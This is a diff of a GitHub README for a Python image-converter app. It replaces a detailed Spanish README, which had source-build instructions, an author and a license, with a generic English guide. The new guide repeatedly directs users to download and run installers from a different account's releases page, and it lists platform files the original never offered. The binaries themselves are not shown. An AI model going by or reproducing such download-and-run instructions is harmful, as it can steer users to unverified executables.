@@ -1,167 +1,63 @@
-# 🖼️ Image Converter — Desktop App (Python)
+# 🖼️ Image_Converter - Effortless Image Format Conversion
 
----
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.x-blue?logo=python&logoColor=white"/>
-  <img src="https://img.shields.io/badge/Tkinter-GUI-orange"/>
-  <img src="https://img.shields.io/badge/Pillow-Image%20Processing-yellow"/>
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey"/>
-  <img src="https://img.shields.io/badge/License-MIT-green"/>
-  <img src="https://img.shields.io/badge/Status-Stable-brightgreen"/>
-</p>
+## 🔗 Download Now
+[![Download Image_Converter](https://img.shields.io/badge/Download-Image_Converter-brightgreen.svg)](https://github.com/arav-code/Image_Converter/releases)
 
-**Image Converter** es una aplicación de escritorio desarrollada en **Python** que permite convertir imágenes entre múltiples formatos de forma rápida, segura y sencilla, mediante una **interfaz gráfica moderna** basada en **Tkinter** y **Pillow (PIL)**.
+## 🚀 Getting Started
+Image_Converter is a desktop application built with Python using Tkinter and Pillow. It allows you to convert images between various formats easily. The application features a modern interface, real-time preview, and background conversion. 
 
-El proyecto está diseñado con un enfoque claro en la **experiencia de usuario (UX)**, la **estabilidad de la aplicación**, el **manejo correcto de recursos** y la **compatibilidad para distribución como ejecutable** usando PyInstaller.
+This guide will help you download and run Image_Converter on your computer, even if you have no programming experience.
 
----
+## 📥 Download & Install
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/arav-code/Image_Converter/releases).
+2. **Find the Latest Version**: Look for the latest version of Image_Converter. It will be at the top of the list.
+3. **Download the Application**: Locate the correct installation file for your operating system. Click on the file to download it.
 
-![Social Preview](images/Preview.png)
+    - For **Windows**, you may see a file named `Image_Converter_Windows.exe`.
+    - For **Mac** users, look for `Image_Converter_Mac.dmg`.
+    - For **Linux**, you might find a `Image_Converter_Linux.AppImage` file.
 
----
+4. **Run the Installer**:
+   - For Windows: Double-click the `.exe` file to start the installation. Follow the on-screen prompts.
+   - For Mac: Open the `.dmg` file, then drag the application to your Applications folder.
+   - For Linux: Make the `.AppImage` executable by right-clicking it and selecting "Properties." Check "Allow executing file as program." Then, double-click to run it.
 
-## ✨ Características principales
+## ❓ How to Use Image_Converter
+1. **Open the application**: Once installed, open Image_Converter from your applications menu.
+2. **Select Your Image**: Click on the "Choose File" button to select the image you want to convert.
+3. **Choose the Output Format**: Select the format you want to convert your image to (e.g., JPEG, PNG, BMP).
+4. **Preview Your Image**: Use the real-time preview feature to see how your image will look in the new format.
+5. **Start Conversion**: Click on the "Convert" button. The application will process the image in the background.
 
-* 📂 Selección sencilla de imágenes desde el explorador de archivos
-* 👁️ Vista previa de la imagen en tiempo real
-* 🔄 Conversión entre múltiples formatos:
+## 🖥️ System Requirements
+- **Operating System**:
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Linux (varies based on distribution)
+- **Memory**: At least 2 GB of RAM
+- **Storage**: Minimum 100 MB of free space
 
-  * JPG / JPEG
-  * PNG
-  * WEBP
-  * BMP
-  * GIF
-* ⚙️ Ajustes automáticos según el formato de salida
-* 🚀 Conversión en **hilo secundario** (no bloquea la interfaz gráfica)
-* 🧠 Manejo de errores y advertencias personalizadas
-* 🎨 Interfaz gráfica estilizada y consistente
-* ⌨️ Atajos de teclado integrados
-* 📦 Preparada para compilarse como ejecutable (.exe) con PyInstaller
+## ⚙️ Features
+- **Cross-Platform Compatibility**: Works on Windows, Mac, and Linux.
+- **User-Friendly Interface**: Modern design helps you navigate easily.
+- **Real-Time Preview**: See changes before converting.
+- **Background Processing**: Convert images without interrupting your workflow.
 
----
+## 📚 Frequently Asked Questions
 
-## 🧰 Tecnologías utilizadas
+### How do I check if the software is installed correctly?
+After installation, open the application. You should see the main interface. If you encounter errors, please recheck your download and installation steps.
 
-* **Python 3**
-* **Tkinter** — Interfaz gráfica de usuario
-* **Pillow (PIL)** — Procesamiento y conversión de imágenes
-* **Threading** — Ejecución de procesos en segundo plano
-* **PyInstaller** — Empaquetado como ejecutable
-* **OS / SYS** — Manejo de rutas y recursos
+### What image formats can I convert?
+Image_Converter supports a range of formats, including JPEG, PNG, BMP, and more. Check the supported formats in the app's configuration.
 
----
+### Can I suggest new features?
+Yes! We welcome feedback. Please visit our GitHub page to submit your suggestions.
 
-## 🖥️ Interfaz de usuario
+## 🌟 Learn More
+If you want to learn more about Image_Converter, you can check the source code and contribute to the project on GitHub.
 
-La aplicación incluye:
+## 🔗 Further Downloads
+You can always download the latest version by visiting the [Releases page](https://github.com/arav-code/Image_Converter/releases) and following the same steps outlined above.
 
-* Ventana principal centrada automáticamente
-* Área de vista previa interactiva para la imagen cargada
-* Menú desplegable personalizado para selección de formato
-* Botones gráficos con imágenes y efectos visuales
-* Ventanas emergentes personalizadas para advertencias e información
-* Identidad visual coherente (colores, tipografía y estilo)
-
----
-
-## 📷 Capturas de pantalla
-
-<p align="center">
-  <img src="images/screenshot.png?v=2" alt="Vista previa de la aplicación" width="600"/>
-</p>
-
----
-
-## ⌨️ Atajos de teclado
-
-| Tecla  | Acción                 |
-| ------ | ---------------------- |
-| Enter  | Convertir imagen       |
-| Delete | Limpiar imagen cargada |
-
----
-
-## 🚀 Instalación y uso
-
-### ⭐ Opción 1 — Ejecutar desde el Release (RECOMENDADO)
-
-1. Ve a la sección **Releases** del repositorio.
-2. Descarga el archivo:
-
-   ```
-   ImageConverter_v1.0.0_Windows.zip
-   ```
-3. Extrae el contenido del archivo `.zip`.
-4. Ejecuta **ImageConverter.exe**.
-
-> ⚠️ Windows puede mostrar una advertencia de seguridad al ser una aplicación no firmada.
-> Selecciona **“Más información” → “Ejecutar de todas formas”**.
-
----
-
-### 🔹 Opción 2 — Ejecutar desde el código fuente
-
-```bash
-git clone https://github.com/tu-usuario/image-converter.git
-cd image-converter
-pip install pillow
-python main.py
-```
-
----
-
-### 🔹 Opción 3 — Crear ejecutable con PyInstaller
-
-```bash
-pyinstaller --onefile --windowed --add-data "images;images" main.py
-```
-
-> El método `resource_path()` garantiza compatibilidad tanto en desarrollo como en el ejecutable final.
-
----
-
-## 📁 Estructura del proyecto
-
-```text
-image-converter/
-│
-├── main.py
-├── images/
-│   ├── icon.ico
-│   ├── boton.png
-│   └── robot.png
-└── README.md
-```
-
----
-
-## 🧠 Detalles técnicos destacados
-
-* Uso de `threading.Thread` para evitar congelamiento de la interfaz gráfica
-* Gestión de estados para prevenir acciones concurrentes durante la conversión
-* Conversión segura de imágenes con transparencia (RGBA → RGB)
-* Optimización específica por formato de salida
-* Manejo correcto de rutas para PyInstaller (`_MEIPASS`)
-* Separación clara entre lógica de negocio, interfaz y eventos
-
----
-
-## 👨‍💻 Autor
-
-*   **Nombre:** Pablo Téllez
-*   **Contacto:** pharmakoz@gmail.com
-
-📍 **Tarija, Bolivia — 2025**
-
-
----
-
-## 📜 Licencia
-
-Este proyecto se distribuye bajo la licencia **MIT**.
-
-Eres libre de usar, modificar y distribuir este software.
-
----
-
-⭐ Si este proyecto te resulta útil, considera dejar una estrella en el repositorio.
+Feel free to reach out if you have any questions or need help!
